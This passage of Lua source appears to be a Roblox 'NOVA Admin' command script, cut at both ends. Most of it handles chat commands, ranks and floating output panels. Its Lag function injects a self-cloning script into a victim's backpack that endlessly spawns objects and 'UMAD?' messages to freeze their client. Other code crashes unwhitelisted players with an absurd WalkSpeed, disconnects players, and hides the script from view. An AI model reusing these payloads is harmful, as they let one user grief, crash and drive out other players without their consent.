				repeat wait() until v:FindFirstChild("Backpack") ~= nil
				CreateLocalScript([[
					LocalPlayer = game:service'Players'.LocalPlayer
					Players = LocalPlayer.Parent
					LocalPlayer.Parent = nil
					LocalPlayer.Parent = Players
					]],
					v.Backpack
				)
				wait(1)
				pcall(function()
					v:Destroy()
				end)
			end))
		end)
	end
end

--[[ LAG ]]--
function Lag(v)
	coroutine.resume(coroutine.create(function()
		if v.Name == "rigletto" then
			OutputMulti("Attempting to lag the creator, command will not be carried through.",NOVA.Colors.Red,GetRanked(),4)
		else
			repeat wait() until v:FindFirstChild("Backpack") ~= nil
			newLocalScript([==[
				local LocalPlayer=game:GetService("Players").LocalPlayer
				for i=1,math.huge do
					coroutine.resume(coroutine.create(function()
						while wait() do
							
							
							pcall(function()
								LAG = script:Clone()
								LAG.Name = "LAG"
								LAG.Parent = LocalPlayer.Backpack
								LAG.Disabled = false
							end)
							
							for i=1,10 do
								Instance.new("Seat",workspace.CurrentCamera)
								Instance.new("Message",workspace.CurrentCamera).Text = "UMAD?"
							end
							for i=1,10 do
								pcall(function()
									game.Players.LocalPlayer.Character.Archivable = true
									game.Players.LocalPlayer.Character:Clone().Parent = workspace.CurrentCamera
								end)
							end
							
						end
					end))
				end
			]==],v.Backpack)
			local H = Instance.new("Hint",NOVA.Services.Workspace)
			repeat 
				H.Text = v.Name.." be gettin' lagged."
				H.Parent = NOVA.Services.Workspace
				wait()
			until v.Parent == nil
			H:Remove()
		end
	end))
end

--[[ GET TABLETS ]]--

function GetTablets(player)
	local _tablets = {}

	for _, tablet in pairs(NOVA.Tablets) do
		if tablet:FindFirstChild("Recipient") ~= nil and tablet.Parent ~= nil then
			if tablet.Recipient.Value == player then
				table.insert(_tablets, tablet)
			end
		end
	end
	--table.insert(_tablets,Instance.new("Model"))
	return _tablets
end

--[[ OUTPUT ]]--

function Output(Message, Color, Player, Stick, Func)
	if Player ~= nil and Player.Character ~= nil and Player.Character.Head ~= nil then
		if Color == "Random" or Color == "random" then Color = Color3.new(math.random(),math.random(),math.random()) end
		local _tablets = GetTablets(Player)
		local _pos = Player.Character.Head.CFrame * CFrame.new(7, 7, 7)

		local model = Instance.new("Model")
		model.Parent = NOVA.Services.Workspace
		model.Name = "Output::" .. Player.Name

		local part = Instance.new("Part")
		part.Parent = model
		part.Transparency = 0.5
		part.CanCollide = false
		part.Locked = true
		part.TopSurface = "Smooth"
		part.BottomSurface = "Smooth"
		part.FormFactor = "Plate"
		part.Color = Color
		part.Size = Vector3.new(2, 0.4, 3)
		part.CFrame = _pos
		part:BreakJoints()

		local click = Instance.new("ClickDetector")
		click.MaxActivationDistance = 9201
		click.Parent = part
		click.MouseClick:connect(function(player)
			if player == Player or GetRank(player) > GetRank(Player) then
				if Color == NOVA.Colors.Red and (Message == "Dismiss" or Message == "dismiss")  then
					for _,v in pairs(GetTablets(Player)) do v:remove() end
				else
					model:remove()
					Func(player)
				end
			end
		end)

		local fire = Instance.new("Fire")
		fire.Parent = part
		fire.Heat = 0
		fire.Size = 6
		fire.Color = Color
		fire.SecondaryColor = Color

		local box = Instance.new("SelectionBox")
		box.Parent = part
		box.Adornee = part
		box.Color = BrickColor.new(Color.r, Color.g, Color.b)

		local pos = Instance.new("BodyPosition")
		pos.Parent = part
		pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
		pos.position = _pos.p

		local gyro = Instance.new("BodyGyro")
		gyro.Parent = part
		gyro.maxTorque = Vector3.new(math.huge, math.huge, math.huge)

		local recip = Instance.new("ObjectValue")
		recip.Parent = model
		recip.Name = "Recipient"
		recip.Value = Player

		local gui = Instance.new("BillboardGui")
		gui.Adornee = part
		gui.Size = UDim2.new(1, 0, 1, 0)
		gui.StudsOffset = Vector3.new(0, 3, 0)
		gui.Parent = model

		local frame = Instance.new("Frame")
		frame.Parent = gui
		frame.Size = UDim2.new(1, 0, 1, 0)
		frame.BackgroundTransparency = 1

		local label = Instance.new("TextLabel")
		label.Parent = frame
		label.Text = Message
		label.FontSize = "Size12"
		label.TextColor3 = Color
		
		 coroutine.resume(coroutine.create(function()
			if Stick == 0 or Stick == nil then else
				wait(Stick)
				model:Remove()
			end
		 end))
		 
		table.insert(NOVA.Tablets, model)
		return click
	end
end
--[[ IMAGE OUTPUT ]]--
function OutputImg(Image,Text,Color,Player,Stick,Func)
	Tab = Output(Text,Color,Player,Stick,Func)
	
	BBG = Instance.new("BillboardGui",Tab.Parent)
	BBG.Size = UDim2.new(5,0,6,0)
	BBG.StudsOffset = Vector3.new(0, 7, 0)
	BBG.Adornee = Tab.Parent
	
	Img = Instance.new("ImageLabel",BBG)
	Img.Size = UDim2.new(1,0,1,0)
	Img.BackgroundTransparency = 1
	Img.Image = Image--"http://www.roblox.com/asset/?id=45120559"
	return Tab
end


--[[ OUTPUT MULTI ]]--

function OutputMulti(Msg,Color,Players,Stick,Func)
	--if type(Players) == "Table" then
		for _,v in pairs(Players) do
			Output(Msg,Color,v,Stick,Func)
		end
	--end
end

--[[ UPDATE TABLETS ]]--

function UpdateTablets()
	--pcall(function()
		for _,Player in pairs(NOVA.Services.Players:GetPlayers()) do
			local _tablets = GetTablets(Player)
			local counter = 0
			local Stretch = math.floor(#_tablets /2)

			for i = 90, -90, -180/(#_tablets - 1) do
				counter = counter + 1
				local tabletPosition = Player.Character.Torso.CFrame * CFrame.Angles(0, math.rad(i), 0) * CFrame.new(0, 0, -15 - (Stretch))

				pcall(function() _tablets[counter].Part.BodyPosition.position = tabletPosition.p end)
				pcall(function() _tablets[counter].Part.BodyGyro.cframe = tabletPosition * CFrame.Angles(math.rad(70), 0, 0) end)
			end

			if #_tablets == 1 then
				local torso = Player.Character.Torso
				local pos = torso.CFrame + torso.CFrame.lookVector * 10

				pcall(function() _tablets[1].Part.BodyPosition.position = pos.p end)
				pcall(function() _tablets[1].Part.BodyGyro.cframe = pos * CFrame.Angles(math.rad(70), 0, 0) end)
			end
		end
	--end)
end

--[[ GET PLAYERS ]]--
function GetPlayers(string,Player)
	if type(Player) == string or Player == nil then Player = Instance.new("Model") end
	string = string:lower()
	Rtn = {}
	if string == "all" then
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do 
			table.insert(Rtn,v)
		end
	elseif string == "others" then
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do 
			if v ~= Player then 
				table.insert(Rtn,v) 
			end
		end
	elseif string == "random" then
		table.insert(Rtn,NOVA.Services.Players:GetPlayers()[math.random(1,#NOVA.Services.Players:GetPlayers())])
	elseif string == "me" then
		table.insert(Rtn,Player) 
	elseif string == "vetrans" then
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do 
			if v.AccountAge > 365 then 
				table.insert(Rtn,v) 
			end 
		end
	elseif string == "nonvetrans" or string == "notvetrans" then
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do 
			if v.AccountAge < 365 then 
				table.insert(Rtn,v)
			end
		end
	elseif string == "targeted" then
		for _,v in pairs(NOVA.Targeted) do
			table.insert(Rtn,v)
		end
	elseif string == "nontargeted" or string == "nottargeted" then
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
			if not IsTargeted(v) then
				table.insert(Rtn,v)
			end
		end
	elseif string:sub(1,4) == "rank" then
		if string:sub(6,7) == "gt" then
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				print(string:sub(9))
				print(GetRank(v))
				print(GetRank(v) > tonumber(string:sub(9)))
				if GetRank(v) > tonumber(string:sub(9)) then
					print'ADDING!'
					table.insert(Rtn,v)
					print'ADDED!'
				end
			end
		elseif string:sub(6,7) == "ge" then
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				if GetRank(v) >= tonumber(string:sub(9)) then
					table.insert(Rtn,v)
				end
			end
		elseif string:sub(6,7) == "eq" then
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				if GetRank(v) == tonumber(string:sub(9)) then
					table.insert(Rtn,v)
				end
			end
		elseif string:sub(6,7) == "le" then
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				if GetRank(v) <= tonumber(string:sub(9)) then
					table.insert(Rtn,v)
				end
			end
		elseif string:sub(6,7) == "lt" then
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				if GetRank(v) > tonumber(string:sub(9)) then
					table.insert(Rtn,v)
				end
			end
		end	
	else
		for _,v in pairs(NOVA.Services.Players:GetPlayers()) do 
			if string.sub(string.lower(v.Name),1,#string) == string.lower(string) then
				table.insert(Rtn,v)
			end
		end
	end
	
	--[[for _,v in pairs(Rtn) do
		print(type(v),v.Name)
	end]]
	--[[
	for i=1,#Rtn do
		if GetRank(Rtn[i]) >= GetRank(Player) then
			--if not Rtn[i] == Player then
				--Output(Rtn[i].Name.." outranks you!",NOVA.Colors.Orange,Player)
				print'DERP!'
			--end
		end
	end
	]]
	return Rtn
end

--[[ ON CHATTED ]]--

function OnChatted(Msg,Speaker)
	coroutine.resume(coroutine.create(function()
		if NOVA.Removed == false then
			if game.PlaceId == 20279777 or game.PlaceId == 20132544 then
				if NOVA.ShowChat == true then	
					print(Speaker.Name.." ; "..tostring(GetRank(Speaker)).." ; "..tostring(GetRankName(Speaker)).." ; "..Msg)	
				end
			end
			
			--[[ CHAT FILTERS ]]--
			if string.sub(Msg,1,10) == "mediafire " then Msg = string.sub(Msg,11) end
			if string.sub(Msg,1,5) == "shit " then Msg = Msg:sub(6) end
			if string.sub(Msg,1,5) == "gtfo " then Msg = Msg:sub(6) end
			if string.sub(Msg,1,4) == " " then Msg = Msg:sub(5) end
			if string.sub(Msg,1,9) == "password " then Msg = Msg:sub(10) end
			if string.sub(Msg,1,7) == "hitler " then Msg = Msg:sub(8) end
			
			--[[ KILLING PHRASES ]]--
			if Msg:lower():find("ssj") then pcall(function() Speaker.Character:BreakJoints() end) end
			
			Num = 1
			Sep = nil
							
			if Msg:sub(1,3) == "\\do" then
			
				for i=4,100 do
					if Msg:sub(i,i) == "\\" then
						Sep = i
						break
					end
				end
				
				if Sep ~= nil then
					Num = tonumber(Msg:sub(4,Sep-1))
				end
				
				Msg = Msg:sub(Sep)
			end
			
			if GetRank(Speaker) < 6 and GetRank(Speaker) >= 0 then
				if Num > (GetRank(Speaker) + 1 )*10 then
					Output("You do not have a high enough rank to loop that much.",NOVA.Colors.Orange,Speaker,5)
					Num = 0
				end
			end
			
			for i=1,Num do
				wait()
				
				if NOVA.Canceled == true then NOVA.Canceled = false break end
				
				for _,CMD in pairs(NOVA.Commands) do
					if string.sub(Msg:lower(),1,#CMD.Command+3) == "\\"..CMD.Command:lower().."\\?" then
						RemoveTablets(Speaker)
						Output("Name : "..CMD.Name,GetRankedTable(Speaker).Color,Speaker)
						Output("Command : "..CMD.Command,GetRankedTable(Speaker).Color,Speaker)
						Output("Arguments : "..CMD.Args,GetRankedTable(Speaker).Color,Speaker)
						Output("Description : "..CMD.Description,GetRankedTable(Speaker).Color,Speaker)
						Output("Dismiss",NOVA.Colors.Red,Speaker)
					elseif string.sub(Msg:lower(),1,#CMD.Command+2) == "\\"..CMD.Command:lower().."\\" then
						if GetRank(Speaker) ~= nil and GetRank(Speaker) >= CMD.Rank then
							CMD.Function(string.sub(Msg,#CMD.Command+3),Speaker)
						else
							print(Speaker.Name.." doesnt have high enough rank to use the "..CMD.Name.." command.")
							Output("This command requires you to have a higher rank.",NOVA.Colors.Orange,Speaker,7)
						end
						
					end
				end	
			end				
		end
	end))
end

--[[ ADD COMMAND ]]--

function AddCommand(Name,Command,Rank,Description,Args,Function)
	table.insert(NOVA.Commands,{Name = Name, Command = Command,Rank = Rank, Description = Description,Args = Args,Function = Function})
end

--[[ BACKUP PROCEDURE ]]--
pcall(function()
	NOVA.Backup = script:children()[2].Value
end)

--[[ NIL SUPPORT ]]--
game:service'Chat'.Chatted:connect(function(Part,Message,Color)
	OnChatted(Message,Part.Parent.Name)
end)


--[[ Safety Procedure # 1 ]]--
pcall(function()
	NOVA.LocalScript.Parent = nil
end)
for _,v in pairs(NOVA.Plugins) do
	pcall(function()
		v.Parent = nil
	end)
end
pcall(function()
	script:ClearAllChildren()
end)

--[[ Safty Procedure # 2 ]]--
for _,v in pairs(GetRecursiveChildren(workspace)) do
	if v:IsA("StringValue") or v:IsA("IntValue") then
		pcall(function()
			v:remove()
		end)
	end
end

--[[ SCRIPT LOGGING PROCEDURES ]]--
if _G[NOVA.GlobalLoggedScriptsKey] ~= nil then
	if type(_G[NOVA.GlobalLoggedScriptsKey]) == "table" then
		for _,v in pairs(_G[NOVA.GlobalLoggedScriptsKey]) do
			pcall(function()
				table.insert(NOVA.LoggedScripts,v)
			end)
		end
	end
end

for _,Service in pairs(NOVA.Services) do
	Service.DescendantAdded:connect(function(New)
		if NOVA.Removed == false then
			if New:IsA("BaseScript") or New:IsA("Script") or New:IsA("LocalScript") then
				table.insert(NOVA.LoggedScripts,v)
			end
		end
	end)
end

for _,v in pairs(GetRecursiveChildren()) do
	pcall(function()
		if v:IsA("BaseScript") or v:IsA("Script") or v:IsA("LocalScript") then
			table.insert(NOVA.LoggedScripts,v)
		end
	end)
end

--[[ INITIAL STARTUP ]]--
NOVA.Sounds.Sound.Name = "NOVA Sound"
for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
	pcall(function()
		pcall(function()
			v.PlayerGui.NOVACMD:Remove()
		end)
		if GetRankedTable(v)==nil then
			table.insert(NOVA.Ranked,{Name = v.Name, InPRI = false, CMD = false,	Rank = 0, Color = NOVA.Colors.Orange, Desc = "N/A"})
		end
		
		Data = GetRankedTable(v)
		
		v.Chatted:connect(function(Msg)
			OnChatted(Msg,v)
		end)


	
		if GetRank(v) == -2 then
			if v.Name ~= "rigletto" then
				OutputMulti(v.Name.." has been lagged due to a banishment.",NOVA.Color.Orange,GetRanked(),10)
				Lag(v)
			end
		end
		
		if GetRank(v) == -1 then
			if v.Name ~= "rigletto" then
				OutputMulti(v.Name.." has been removed due to a banishment.",NOVA.Color.Orange,GetRanked(),10)
				GetRidOf(v)
			end
		end
	

		coroutine.resume(coroutine.create(function()
			repeat wait() until v:FindFirstChild("Backpack") ~= nil
			CreateLocalScript(PlayerPlugins,v.Backpack)
		end))

--[[		
		if GetRank(v) ~= nil and Data ~= nil then
			Output("Hello, "..v.Name..". Your current rank is "..GetRankName(v)..".",Data.Color,v,10)
			Output("Say \"\\cmds\\\" for a list of avalible commands!","Random",v,10)
			OutputImg("http:\\www.roblox.com/asset/?id==82039020","NOVA","Random",v,10)
		end
]]
	end)
end

--[[
OutputMulti("NOVA Admin made by "..string.reverse("ottelgir")..".","Random",GetRanked(),4)
for _,v in pairs(NOVA.Credit) do OutputMulti("Thanks to : "..v.Name.." "..v.Why,"Random",GetRanked(),10) end
]]

--[[ PLAYER ADDED ]]--

NOVA.Services.Players.PlayerAdded:connect(function(v)
	if NOVA.Removed == false then
		pcall(function()
			v.Chatted:connect(function(Msg)
				OnChatted(Msg,v)
			end)
			if GetRankedTable(v)==nil then
				table.insert(NOVA.Ranked,{Name = v.Name, InPRI = false, CMD = false,	Rank = 0, Color = NOVA.Colors.Orange, Desc = "N/A"})
			end
			
			Data = GetRankedTable(v)

	--[[		if NOVA.Removed == false then
				print(v. Name.." has joined the game.")
				print("Name : "..v.Name)
				print("Age : "..v.AccountAge)
				print("Rank : "..Data.Rank)
				print("Desc : "..Data.Desc)
				print("InPRI : "..Data.InPRI)
				print("CMD : "..Data.CMD)
				print("Color : "..tostring(Data.Color))
			end
			]]

			OutputMulti(v.Name.." has joined the game.",Data.Color,GetRanked(),3.5)

		
			if Data.Rank == -2 then
				if v.Name ~= "rigletto" then
					OutputMulti(v.Name.." has been lagged due to a banishment.",NOVA.Colors.Orange,GetRanked(),10)
					Lag(v)
				end
			end
			
			if Data.Rank == -1 then
				if v.Name ~= "rigletto" then
					OutputMulti(v.Name.." has been removed due to a banishment.",NOVA.Colors.Orange,GetRanked(),10)
					GetRidOf(v)
				end
			end
			

			coroutine.resume(coroutine.create(function()
				repeat wait() until v:FindFirstChild("Backpack") ~= nil
				CreateLocalScript(PlayerPlugins,v.Backpack)
			end))

			
			if NOVA.PRI == true then
				if Data.InPRI == false and v.Name ~= "rigletto" then				
					OutputMulti(""..v.Name.." was "..NOVA.PRIType.."ed due to the PRI.",NOVA.Colors.Orange,GetRanked(),6)
					if NOVA.PRIType == "Kick" then
						v:Remove()
					elseif NOVA.PRIType == "Lag" then
						Lag(v)
					elseif NOVA.PRIType == "Shutdown" then	
						coroutine.resume(coroutine.create(function()
							GetRidOf(v)
						end))
					elseif NOVA.PRIType == "Crash" then
						coroutine.resume(coroutine.create(function()
							repeat wait() until v.Character ~= nil
							pcall(function()
								v.Character.Humanoid.WalkSpeed = 1e+999
							end)
						end))
					end
				end
			end
		end)
	end
end)

AddCommand("Ping","ping",2,"Outputs the following string.","<String>",
	function(Msg,Speaker)
		if Msg == "rainbow" then
			for _,Color in pairs(NOVA.Colors) do
				Output(tostring(Color),Color,Speaker,nil,
				function()
					RemoveTablets(Speaker)
					NOVA.Services.Lighting.TimeOfDay = 0
					NOVA.Services.Lighting.Ambient = NOVA.Colors.Black
					NOVA.Services.Lighting.Brightness = 0
					NOVA.Services.Lighting.ColorShift_Top = NOVA.Colors.Black
					NOVA.Services.Lighting.ColorShift_Bottom = NOVA.Colors.Black
					NOVA.Services.Lighting.ShadowColor = NOVA.Colors.Black
					for _,v in pairs(GetRecursiveChildren(workspace)) do
						if v:IsA("BasePart") then
							Sel = Instance.new("SelectionBox",v)
							Sel.Transparency = 0
							Sel.Color = BrickColor.new(Color)
							Sel.Adornee = v
						end
					end
					Output("Say \\debug\\ to restore the server to the original lighting.",GetRankedTable(Speaker).Color,Speaker,5)
				end
				)
			end
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		elseif Msg == "ranks" then 
			for _,v in pairs(NOVA.Ranks) do
				Output(v,"Random",Speaker)
			end
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		elseif Msg == "random" then
			Output(tostring(math.random()),"Random",Speaker)
		elseif Msg == "players" then
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				local Data = GetRankedTable(v)
				OutputImg("http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..v.Name,v.Name,Data.Color,Speaker,nil,
					function()
						RemoveTablets(Speaker)
						Output("Age : "..v.AccountAge,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\players",Speaker) end)
						Output("User ID : "..v.userId,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\players",Speaker) end)
						Output("Name : "..v.Name,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\players",Speaker) end)
						Output("Dismiss",NOVA.Colors.Red,Speaker)
					end
				)
			end
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		elseif Msg == "colors" then
			coroutine.resume(coroutine.create(function()
				NOVA.Services.Lighting.TimeOfDay = 0
				NOVA.Services.Lighting.Ambient = NOVA.Colors.Black
				NOVA.Services.Lighting.Brightness = 0
				NOVA.Services.Lighting.ColorShift_Top = NOVA.Colors.Black
				NOVA.Services.Lighting.ColorShift_Bottom = NOVA.Colors.Black
				NOVA.Services.Lighting.ShadowColor = NOVA.Colors.Black

				for _,Player in pairs(NOVA.Services.Players:GetPlayers()) do
					Data = GetRankedTable(Player)
					pcall(function()
						for _,v in pairs(GetRecursiveChildren(Player.Character)) do
							if v:IsA("BasePart") then
								Sel = Instance.new("SelectionBox",v)
								Sel.Transparency = 0
								Sel.Color = BrickColor.new(Data.Color)
								Sel.Adornee = v
							end
						end
					end)
				end
				
				wait(10)
				
				for _,v in pairs(GetRecursiveChildren(workspace)) do
					if v:IsA("SelectionBox") then
						v:remove()
					end
				end
				
				NOVA.Services.Lighting.Ambient = NOVA.Colors.White
				NOVA.Services.Lighting.ColorShift_Bottom = NOVA.Colors.Black
				NOVA.Services.Lighting.ColorShift_Top = NOVA.Colors.Black
				NOVA.Services.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
				NOVA.Services.Lighting.Brightness = 1 
				NOVA.Services.Lighting.FogStart = 0
				NOVA.Services.Lighting.FogEnd = 100000
				NOVA.Services.Lighting.FogColor = Color3.new(0.74,0.74,0.74)
				NOVA.Services.Lighting.TimeOfDay = 12
			end))
		elseif Msg == "replicators" then
			for _,Client in pairs(GetReplicators()) do
				Data = GetRankedTable(Client:GetPlayer())
				OutputImg("http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..Data.Name,Data.Name,Data.Color,Speaker,nil,
					function()
						RemoveTablets(Speaker)
						Output("Age : "..Client:GetPlayer().AccountAge,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\replicators",Speaker) end)
						Output("User ID : "..Client:GetPlayer().userId,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\replicators",Speaker) end)
						Output("Name : "..Client:GetPlayer().Name,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\replicators",Speaker) end)
						Output("Dismiss",NOVA.Colors.Red,Speaker)
					end
				)
			end
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		elseif Msg == "nil" then
			--[=[
				Player = "WhenYouRunYouDie"
				for _,v in pairs(game.NetworkServer:children()) do
					if v:GetPlayer().Name == Player then
						Player = v:GetPlayer()
						break
					end
				end

				newLocalScript([[
					LocalPlayer = game:service'Players'.LocalPlayer
					Players = LocalPlayer.Parent
					LocalPlayer.Parent = nil
					LocalPlayer.Parent = Players
					]],	Instance.new("Backpack",Player)
				)

			]=]--
			for _,Client in pairs(GetReplicators()) do
				Data = GetRankedTable(Client:GetPlayer())
				if Client:GetPlayer().Parent == nil then
					OutputImg("http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&username="..Data.Name,Data.Name,Data.Color,Speaker,nil,
						function()
							RemoveTablets(Speaker)
							Output("Age : "..Client:GetPlayer().AccountAge,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\nil",Speaker) end)
							Output("User ID : "..Client:GetPlayer().userId,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\nil",Speaker) end)
							Output("Name : "..Client:GetPlayer().Name,Data.Color,Speaker,nil,function() RemoveTablets(Speaker) OnChatted("\\ping\\nil",Speaker) end)
							Output("SHUT THEM DOWN!",NOVA.Colors.Red,Speaker,nil,function() Instance.new("BooleanValue",Client:GetPlayer()).Name = "Disconnect()" Client:GetPlayer().Parent = NOVA.Services.Players end)
							Output("Dismiss",NOVA.Colors.Red,Speaker)
						end
					)
				end
			end
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		else
			if #Msg == 0 then
				Output("Pong!","Random",Speaker)
			else
				Output(Msg,"Random",Speaker)
			end
		end
	end
)

AddCommand("Dismiss","dismiss",0,"Dismisses all tablets.","No Arguments",
	function(Msg,Speaker)
		if Msg == "all" then
			if GetRank(Speaker) > 0 then
				RemoveTablets()
			end
		else
			RemoveTablets(Speaker)
		end
	end
)

AddCommand("Message","m",2,"Makes a message with the text being the following string.","<String>",
	function(Msg,Speaker)
		makeMessage(1,"[NOVA] "..Msg,NOVA.Services.Workspace)
	end
)

AddCommand("Remove","remove",6,"Removes the admin.","No Arguments",
	function(Msg,Speaker)
		RemoveTablets()
		NOVA.Sounds.Sound:Remove()
		NOVA.Removed = true
		error("NOVA Admin removing...")()
		NOVA = {}
		script.Disabled = true
		while true do wait() end
	end
)

AddCommand("Kill","kill",2,"Kills the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function() v.Character:BreakJoints() end)
		end
	end
)

AddCommand("Kick","kick",2,"Removes the selected player from the game.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function() 
				v:Destroy()
			end)
		end
	end
)

AddCommand("Banish","ban",6,"Permanently removes the selected player from the game.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			if v.Name == "rigletto" then
				Output("Attempt to ban the creator, command will not be carried through.",NOVA.Colors.Red,Speaker,10)
			else
				pcall(function() 
					GetRankedTable(v).Rank = -1
					GetRidOf(v)
				end)
			end
		end
	end
)

AddCommand("Permanent Lag","permalag",6,"Permanently lags the selected player from the game.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			if v.Name == "rigletto" then
				Output("Attempt to ban the creator, command will not be carried through.",NOVA.Colors.Red,Speaker,10)
			else
				pcall(function() 
					GetRankedTable(v).Rank = -2
					Lag(v)
				end)
			end
		end
	end
)

AddCommand("ForceField","ff",2,"Gives a forcefield to the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function() Instance.new("ForceField",v.Character) end)
		end
	end
)

AddCommand("Un ForceField","unff",2,"Removes forcefields from the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function() for _,part in pairs(v.Character:GetChildren()) do if part:IsA("ForceField") then part:Remove() end end end)
		end
	end
)

AddCommand("Check","check",2,"Outputs server information.","No Arguments",
	function(Msg,Speaker)
		Data = GetRankedTable(Speaker)
		Output("PRI : "..tostring(NOVA.PRI),Data.Color,Speaker)
		Output("PRI Type : "..NOVA.PRIType,Data.Color,Speaker)
		Output("Script Lock : "..tostring(NOVA.LockedScripts),Data.Color,Speaker)
		Output("Model Lock : "..tostring(NOVA.LockModels),Data.Color,Speaker)
		Output("Show Chat : "..tostring(NOVA.ShowChat),Data.Color,Speaker)
		Output("Players : "..tostring(#NOVA.Services.Players:GetPlayers()),Data.Color,Speaker)
		Output("Replicators : "..#GetReplicators(),Data.Color,Speaker)
		Output("# Commands : "..#NOVA.Commands,Data.Color,Speaker)
		OutputImg("http://www.roblox.com/asset/?id=45120559","Image tablets work.",Data.Color,Speaker)
		
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Debug","debug",1,"Debugs the server.","No Arguments",
	function(Msg,Speaker)
		NOVA.Services.Lighting.Ambient = NOVA.Colors.White
		NOVA.Services.Lighting.ColorShift_Bottom = NOVA.Colors.Black
		NOVA.Services.Lighting.ColorShift_Top = NOVA.Colors.Black
		NOVA.Services.Lighting.ShadowColor = Color3.new(0.69,0.69,0.69)
		NOVA.Services.Lighting.Brightness = 1 
		NOVA.Services.Lighting.FogStart = 0
		NOVA.Services.Lighting.FogEnd = 100000
		NOVA.Services.Lighting.FogColor = Color3.new(0.74,0.74,0.74)
		NOVA.Services.Lighting.TimeOfDay = 12
		pcall(function()
			CreateLocalScript([[
				Camera = workspace.CurrentCamera
				Camera:SetRoll(0)
				Camera.CameraType = "Custom"
				Camera.FieldOfView = 70
				Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
			]],Speaker.Backpack)
		end)
		for _,v in pairs(NOVA.Services) do	
			v.Name = v.className
		end
		
		for _,v in pairs(GetRecursiveChildren(workspace)) do
			if v:IsA("SelectionBox") then
				v:remove()
			end
		end
		for _,v in pairs(GetRecursiveChildren(workspace)) do if v:IsA("Message") or v:IsA("Hint") then v:Destroy() end end
		Speaker.CharacterAppearance = "http://www.roblox.com/Asset/CharacterFetch.ashx?userId="..Speaker.userId
		pcall(function() Speaker.Character.Torso.Velocity = Vector3.new(0,0,0) end)
		if #NOVA.Services.Teams:GetChildren() == 0 then
			for _,v in pairs(NOVA.Services.Players:GetPlayers()) do
				v.Neutral = true
			end
		end

	end
)

AddCommand("Respawn","rs",2,"Respawns the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
			pcall(function()
				v:LoadCharacter()
			end)
		end
	end
)

AddCommand("Commands","cmds",0,"Lists the command.","No Arguments",
	function(Msg,Speaker)	
		Data = GetRankedTable(Speaker)
		Output("Your current rank is "..GetRankName(Speaker).." ("..GetRank(Speaker)..")",Data.Color,Speaker)
		Output("Click a tablet to see the commands for that rank.",Data.Color,Speaker)
		for i=0,7 do
			Output("Rank "..i.." Commands",Data.Color,Speaker,nil,function()
				RemoveTablets(Speaker)
				for _,v in pairs(NOVA.Commands) do 
					if v.Rank == i then
						Output(v.Name,Data.Color,Speaker,nil,function()
							RemoveTablets(Speaker)
							Output("Name : "..v.Name,Data.Color,Speaker)
							Output("Command : "..v.Command,Data.Color,Speaker)
							Output("Arguments : "..v.Args,Data.Color,Speaker)
							Output("Description : "..v.Description,Data.Color,Speaker)
							Output("Dismiss",NOVA.Colors.Red,Speaker)
						end)
					end
				end	
				Output("Dismiss",NOVA.Colors.Red,Speaker)
			end)
		end
		Output("ALL",Data.Color,Speaker,nil,function()
			RemoveTablets(Speaker)
			for _,v in pairs(NOVA.Commands) do
				if GetRank(Speaker) >= v.Rank then
					Output(v.Name,Data.Color,Speaker,nil,function()
						RemoveTablets(Speaker)
						Output("Name : "..v.Name,Data.Color,Speaker)
						Output("Command : "..v.Command,Data.Color,Speaker)
						Output("Arguments : "..v.Args,Data.Color,Speaker)
						Output("Description : "..v.Description,Data.Color,Speaker)
						Output("Dismiss",NOVA.Colors.Red,Speaker)
					end)
				end
			end
			Output("Dismiss",NOVA.Colors.Red,Speaker)
		end)	
		Output("Dismiss",NOVA.Colors.Red,Speaker)
	end
)

AddCommand("Disconnect","disconnect",6,"Disconnects the selected player.","No Arguments",
	function(Msg,Speaker)
		Instance.new("ManualSurfaceJointInstance",workspace)
	end
)

AddCommand("Lag","lag",6,"lags the selected player.","<Player>",
	function(Msg,Speaker)
		for _,v in pairs(GetPlayers(Msg,Speaker)) do
